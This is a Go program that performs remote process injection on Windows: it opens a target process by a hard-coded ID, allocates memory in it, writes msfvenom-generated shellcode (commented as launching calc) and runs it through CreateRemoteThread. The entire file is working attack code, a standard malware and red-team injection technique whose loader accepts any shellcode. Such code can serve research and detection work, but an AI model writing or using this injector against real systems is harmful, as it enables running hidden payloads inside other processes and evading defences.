package main

import (
	"encoding/hex"
	"fmt"
	"log"
	"syscall"
	"unsafe"

	"golang.org/x/sys/windows"
)

func main() {
	pid := uint32(21336)
	PROCESS_ALL_ACCESS := windows.STANDARD_RIGHTS_REQUIRED | windows.SYNCHRONIZE | 0xFFFF

	//msfvenom  -f hex -p windows/x64/exec cmd=calc
	sc, _ := hex.DecodeString("fc4883e4f0e8c0000000415141505251564831d265488b5260488b5218488b5220488b7250480fb74a4a4d31c94831c0ac3c617c022c2041c1c90d4101c1e2ed524151488b52208b423c4801d08b80880000004885c074674801d0508b4818448b40204901d0e35648ffc9418b34884801d64d31c94831c0ac41c1c90d4101c138e075f14c034c24084539d175d858448b40244901d066418b0c48448b401c4901d0418b04884801d0415841585e595a41584159415a4883ec204152ffe05841595a488b12e957ffffff5d48ba0100000000000000488d8d0101000041ba318b6f87ffd5bbf0b5a25641baa695bd9dffd54883c4283c067c0a80fbe07505bb4713726f6a00594189daffd563616c6300")

	fmt.Printf("[+] Getting a handle on process with pid: %d\n", pid)
	pHandle, err := windows.OpenProcess(uint32(PROCESS_ALL_ACCESS), false, pid)
	if err != nil {
		log.Fatalf("[FATAL] Unable to get a handle on process with id: %d : %v ", pid, err)
	}

	fmt.Printf("[+] Obtained a handle 0x%x on process with ID: %d\n", pHandle, pid)

	modKernel32 := syscall.NewLazyDLL("kernel32.dll")
	procVirtualAllocEx := modKernel32.NewProc("VirtualAllocEx")

	addr, _, lastErr := procVirtualAllocEx.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(len(sc)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		uintptr(windows.PAGE_READWRITE))

	if addr == 0 {
		log.Fatalf("[FATAL] VirtualAlloc Failed: %v\n", lastErr)
	}

	fmt.Printf("[+] Allocated Memory Address: 0x%x\n", addr)
	var numberOfBytesWritten uintptr
	err = windows.WriteProcessMemory(pHandle, addr, &sc[0], uintptr(len(sc)), &numberOfBytesWritten)
	if err != nil {
		log.Fatalf("[FATAL] Unable to write shellcode to the the allocated address")
	}
	fmt.Printf("[+] Wrote %d/%d bytes to destination address\n", numberOfBytesWritten, len(sc))

	var oldProtect uint32
	err = windows.VirtualProtectEx(pHandle, addr, uintptr(len(sc)), windows.PAGE_EXECUTE_READ, &oldProtect)

	if err != nil {
		log.Fatalf("[FATAL] VirtualProtect Failed: %v", err)
	}

	procCreateRemoteThread := modKernel32.NewProc("CreateRemoteThread")
	var threadId uint32 = 0
	tHandle, _, lastErr := procCreateRemoteThread.Call(
		uintptr(pHandle),
		uintptr(0),
		uintptr(0),
		addr,
		uintptr(0),
		uintptr(0),
		uintptr(unsafe.Pointer(&threadId)),
	)
	if tHandle == 0 {
		log.Fatalf("[FATAL] Unable to Create Remote Thread: %v \n", lastErr)
	}

	fmt.Printf("[+] Handle of newly created thread:  0x%x \n[+] Thread ID: %d\n", tHandle, threadId)
	//windows.WaitForSingleObject(windows.Handle(tHandle), windows.INFINITE)
}
